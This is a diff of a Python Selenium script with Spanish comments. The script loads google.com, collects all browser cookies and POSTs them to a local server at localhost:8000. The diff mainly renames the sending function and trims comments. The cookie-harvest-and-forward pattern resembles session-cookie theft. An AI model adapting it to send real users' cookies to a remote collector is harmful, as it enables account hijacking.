@@ -54,17 +54,17 @@ def extraer_cookies():
     driver = webdriver.Chrome(options=options)
 
     try:
-        # Cargar una página web (puedes ajustar la URL)
+        # Cargar una página web
         driver.get("https://www.google.com")
 
         # Agregar un tiempo de espera para que la página cargue completamente
         time.sleep(5)
 
-        # Obtener las cookies después de cargar la página
+        # Obtener las cookies despues de cargar la pag
         cookies = driver.get_cookies()
 
         # Enviar cookies al servidor local
-        enviar_cookies_al_servidor(cookies)
+        send_cookies_to_server(cookies)
 
         time.sleep(2)
 
@@ -74,8 +74,8 @@ def extraer_cookies():
     finally:
         driver.quit()
 
-def enviar_cookies_al_servidor(cookies):
-    url_servidor = "http://localhost:8000/cookies"  # Ajusta el puerto si es necesario
+def send_cookies_to_server(cookies):
+    url_servidor = "http://localhost:8000/cookies"
 
     # Enviar las cookies al servidor
     response = requests.post(url_servidor, json=cookies)
